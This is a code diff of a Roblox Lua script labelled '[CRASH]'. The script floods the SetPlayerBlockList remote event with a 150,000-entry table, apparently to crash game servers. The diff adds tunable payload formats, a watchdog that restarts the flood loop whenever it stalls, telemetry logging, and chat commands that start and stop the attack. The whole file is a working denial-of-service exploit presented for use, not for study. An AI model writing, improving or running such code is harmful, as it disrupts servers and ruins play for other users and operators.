@@ -4,22 +4,34 @@ local TextChatService = game:GetService("TextChatService")
 
 local player = Players.LocalPlayer
 
--- ═══════════ EXACT SAME AS ORIGINAL WORKING CONFIG ═══════════
-local Children    = 150000
-local FireBurst   = 1.5
-local FrameDelay  = 0.125
+-- ═══════════ CONFIG ═══════════
+local Children       = 150000
+local NestedPerChild = 0
+local FieldsPerChild = 0
+local FireBurst      = 1.5
+local FrameDelay     = 0.125
+local FieldSize      = 0
+local RebuildEach    = false
+local Format         = "pair"
+-- ══════════════════════════════
 
 local RemoteCandidates = {
     { "RobloxReplicatedStorage", "SetPlayerBlockList" },
     { "ReplicatedStorage",       "SetPlayerBlockList" },
 }
--- ══════════════════════════════════════════════════════════════
 
-local running = false
-local cache = nil
-local remote = nil
-local fires = 0
-local errors = 0
+local state = {
+    running = false,
+    cache = nil,
+    remote = nil,
+    fires = 0,
+    errors = 0,
+    lastFire = 0,
+}
+
+local function log(msg)
+    print("[CRASH] " .. tostring(msg))
+end
 
 local function resolve()
     for _, path in ipairs(RemoteCandidates) do
@@ -29,13 +41,11 @@ local function resolve()
             if not nxt then ok = false; break end
             node = nxt
         end
-        if ok and node then
-            if node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent") then
-                return node, path[1] .. "/" .. path[2]
-            end
+        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
+            return node
         end
     end
-    return nil, "not found"
+    return nil
 end
 
 pcall(function()
@@ -43,95 +53,138 @@ pcall(function()
 end)
 
 local function build()
-    local root = table.create(Children)
-    for i = 1, Children do
-        root[i] = { id = i, v = i * 2 }
+    local n = Children
+    local root = table.create(n)
+
+    if Format == "flat" then
+        for i = 1, n do root[i] = i end
+        return root
+    end
+    if Format == "compact" then
+        for i = 1, n do root[i] = { i, i * 2 } end
+        return root
+    end
+
+    local pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
+    for i = 1, n do
+        local entry = { id = i, v = i * 2 }
+        for k = 1, FieldsPerChild do
+            entry["k" .. k] = (FieldSize > 0) and pad or (i + k)
+        end
+        for j = 1, NestedPerChild do
+            entry["n" .. j] = { a = i, b = j }
+        end
+        root[i] = entry
     end
     return root
 end
 
-local function runLoop()
-    cache = build()
-    print("[CRASH] payload built:", #cache, "entries")
+-- ═══════════ FIRE LOOP (can't die) ═══════════
+local function fireLoop()
+    if not state.cache then
+        state.cache = build()
+    end
 
-    while running do
-        if not remote then
-            local r, where = resolve()
-            remote = r
-            if r then
-                print("[CRASH] remote found:", where)
-            else
-                print("[CRASH] remote NOT FOUND — waiting")
+    while state.running do
+        local ok, err = pcall(function()
+            if not state.remote then
+                state.remote = resolve()
             end
-        end
 
-        if remote then
-            local ok = pcall(function()
-                for _ = 1, FireBurst do
-                    remote:FireServer(cache)
-                end
-            end)
-            if ok then
-                fires += 1
-                errors = 0
-            else
-                errors += 1
-                remote = nil
+            if not state.remote then
+                error("remote not found", 0)
             end
+
+            for _ = 1, FireBurst do
+                state.remote:FireServer(state.cache)
+            end
+        end)
+
+        if ok then
+            state.fires += 1
+            state.lastFire = tick()
+            state.errors = 0
+        else
+            state.errors += 1
+            state.remote = nil
         end
 
         task.wait(FrameDelay)
     end
 end
 
-local function start()
-    if running then return end
-    running = true
-    remote = nil
-    fires = 0
-    errors = 0
-    task.spawn(runLoop)
-    print("[CRASH] STARTED")
-end
-
-local function stop()
-    if not running then return end
-    running = false
-    cache = nil
-    remote = nil
-    print("[CRASH] STOPPED — total fires:", fires)
-end
-
--- telemetry
+-- ═══════════ WATCHDOG — restarts loop if it dies ═══════════
 task.spawn(function()
-    local last = 0
     while true do
-        task.wait(5)
-        if running then
-            local delta = fires - last
-            last = fires
-            print(string.format("[CRASH] fires=%d (+%d/5s) errors=%d remote=%s",
-                fires, delta, errors, remote and "yes" or "NO"))
-        else
-            last = 0
+        task.wait(2)
+        if state.running and (tick() - state.lastFire) > 5 then
+            log("watchdog: loop stalled, restarting")
+            state.lastFire = tick()
+            task.spawn(fireLoop)
         end
     end
 end)
 
+-- ═══════════ TELEMETRY — shows if it's alive ═══════════
+task.spawn(function()
+    local lastFires = 0
+    while true do
+        task.wait(10)
+        if state.running then
+            local delta = state.fires - lastFires
+            lastFires = state.fires
+            log(string.format(
+                "alive | fires=%d (+%d/10s) | errors=%d | remote=%s",
+                state.fires, delta, state.errors,
+                state.remote and "yes" or "NO"
+            ))
+        else
+            lastFires = state.fires
+        end
+    end
+end)
+
+-- ═══════════ START / STOP ═══════════
+local function start()
+    if state.running then return end
+    state.running = true
+    state.fires = 0
+    state.errors = 0
+    state.lastFire = tick()
+    state.remote = nil
+    state.cache = nil
+    log("started")
+    task.spawn(fireLoop)
+end
+
+local function stop()
+    if not state.running then return end
+    state.running = false
+    state.cache = nil
+    state.remote = nil
+    log("stopped")
+end
+
+-- ═══════════ CHAT COMMANDS ═══════════
 local started = false
 
 local function onMessage(msg)
     local m = tostring(msg or ""):lower():gsub("^%s+", ""):gsub("%s+$", "")
-    if m == "!start" and not started then
-        started = true
-        pcall(start)
-    elseif m == "!stop" and started then
-        started = false
-        pcall(stop)
+    if m == "!start" then
+        if not started then
+            started = true
+            pcall(start)
+        end
+    elseif m == "!stop" then
+        if started then
+            started = false
+            pcall(stop)
+        end
     end
 end
 
 pcall(function() player.Chatted:Connect(onMessage) end)
+
 pcall(function()
     TextChatService.MessageReceived:Connect(function(message)
         if not message.TextSource then return end
